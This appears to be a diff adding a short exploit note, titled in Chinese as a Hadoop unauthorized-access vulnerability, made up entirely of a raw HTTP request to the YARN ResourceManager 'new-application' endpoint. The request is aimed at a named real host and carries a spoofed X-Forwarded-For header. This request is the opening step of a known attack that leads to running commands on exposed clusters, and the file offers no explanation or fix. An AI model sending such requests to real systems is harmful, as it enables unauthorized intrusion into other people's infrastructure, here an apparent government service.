@@ -1,0 +1,8 @@
+# Hadoop未授权访问漏洞
+POST /ws/v1/cluster/apps/new-application HTTP/1.1
+Host: gz.gd.singlewindow.cn
+User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+Accept: */*
+Accept-Encoding: gzip
+Accept-Language: en
+X-Forwarded-For: 118.255.133.117
